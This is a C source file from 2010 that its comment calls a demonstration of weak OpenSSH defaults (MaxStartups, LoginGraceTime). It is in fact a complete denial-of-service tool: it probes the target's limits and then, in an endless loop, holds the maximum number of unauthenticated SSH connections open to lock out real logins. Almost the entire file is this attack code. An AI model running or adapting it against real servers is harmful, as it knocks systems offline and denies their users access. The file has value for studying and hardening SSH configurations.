/* Copy me if you can
 * 2010 - Nico Golde <nico@ngolde.de>
 * simple program demonstrating possible problems of an openssh
 * default configuration, specificly MaxStartups and LoginGraceTime.
 * this is a known problem, e.g. dropbear got CVE-2006-1206 for that
 * and while openssh has ways to mitigate this problem those aren't
 * used in a default configuration and seem to be rarely used.
 *
 * the sun openssh server that identifies itself with SSH-2.0-Sun_SSH
 * and which seems to be an openssh fork has even more strange defaults,
 * LoginGraceTime is 600 there, MaxStartups also not used.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/time.h>
#include <time.h>

#define MAX_SOCK 200

/* default values referring to man 5 sshd_config */
#define LOGINGRACE 120
#define MAXSTARTUP 10

static void
usage(char *arg){
	printf("%s hostip:port [logingracetime]\n", arg);
	exit(EXIT_FAILURE);
}

void
error(char *arg){
	perror(arg);
	exit(-1);
}

static int
get_max_startups(struct sockaddr_in* cs){
	int socks[MAX_SOCK];
	char tmp;
	int i,y;
	for(i=0; i<MAX_SOCK; i++){
		if(-1 == (socks[i] = socket(cs->sin_family, SOCK_STREAM, 0))){
			return -1;
		}
		if(0 > connect(socks[i], (struct sockaddr*) cs, sizeof(struct sockaddr_in))){
			error("socket()");
		}

		/* ssh accepted the socket but closed it right afterwards */
		if(0 == read(socks[i], &tmp, 1))
			break;
	}
	for(y=0; y<i;y++) close(socks[y]);

	return i;
}

static time_t
get_logingrace_time(struct sockaddr_in *cs){
	int fd, r;
	fd_set rd;
	char tmp;
	time_t bt, at;

	if(-1 == (fd = socket(cs->sin_family, SOCK_STREAM, 0))){
		return 0;
	}
	if(0 > connect(fd, (struct sockaddr*) cs, sizeof(struct sockaddr_in))){
		error("connect()");
	}

	FD_ZERO(&rd);
	bt = time(NULL);
	while(1){
		FD_SET(fd, &rd);
		if(0 > (r = select(1024, &rd, NULL, NULL, NULL)))
			return 0;

		if(FD_ISSET(fd, &rd)){
			if(0 == read(fd, &tmp, 1)){
				at = time(NULL);
				break;
			}
		}
	}
	return at-bt;
}

int
main(int argc, char **argv){
	int socks[MAX_SOCK];
	struct sockaddr_in cs;
	unsigned int port;
	time_t login_grace = LOGINGRACE;
	unsigned int max_startups;
	int i,y;
	char *host, *tmp = NULL;

	if(argc < 2) usage(argv[0]);

	host = argv[1];
	if(NULL == (tmp = strchr(argv[1], ':'))){
		usage(argv[0]);
	}

	*tmp = 0;
	tmp++;

	if((port = strtol(tmp, NULL, 10)) == 0){
		perror("strtol())");
		usage(argv[0]);
	}

	memset(socks, 0, MAX_SOCK);
	cs.sin_family = AF_INET;
	cs.sin_port = htons(port);
	cs.sin_addr.s_addr = inet_addr(host);
	if(-1 == cs.sin_addr.s_addr){
		printf("error converting %s to in_addr_t\n", host);
		usage(argv[0]);
	}
	if(3 == argc){
		if(0 == (login_grace = strtol(argv[2], NULL, 10))){
			perror("strtol()");
			usage(argv[0]);
		}
	} else {
		printf("[+] estimating LoginGraceTime setting....\n");
		if(0 == (login_grace = get_logingrace_time(&cs))){
			printf("[!] error determining LoginGraceTime, using default of %d\n", LOGINGRACE);
			login_grace = LOGINGRACE;
		}
	}

	printf("[+] getting needed connection count...\n");
	if(0 >= (max_startups = get_max_startups(&cs)))
		max_startups = MAXSTARTUP;

	printf("[+] attacking %s port %u with %u connections\n", host, port, max_startups);
	while(1){
		for(i=0; i<max_startups; i++){
			printf("\0337");
			printf("\033[1K[+] opening connection %d", i+1);
			printf("\0338");
			if(-1 == (socks[i] = socket(cs.sin_family, SOCK_STREAM, 0))){
				error("socket()");
			}
			if(0 > connect(socks[i], (struct sockaddr*) &cs, sizeof(struct sockaddr_in))){
				error("connect()");
			}
		}

		printf("\n[*] sleeping for %u seconds...\n", login_grace);
		sleep((unsigned int) login_grace);
		printf("[+] closing connections and restarting\n");
		for(y=0; y<=i; y++){
			close(socks[y]);
		}
	}
	return 0;
}

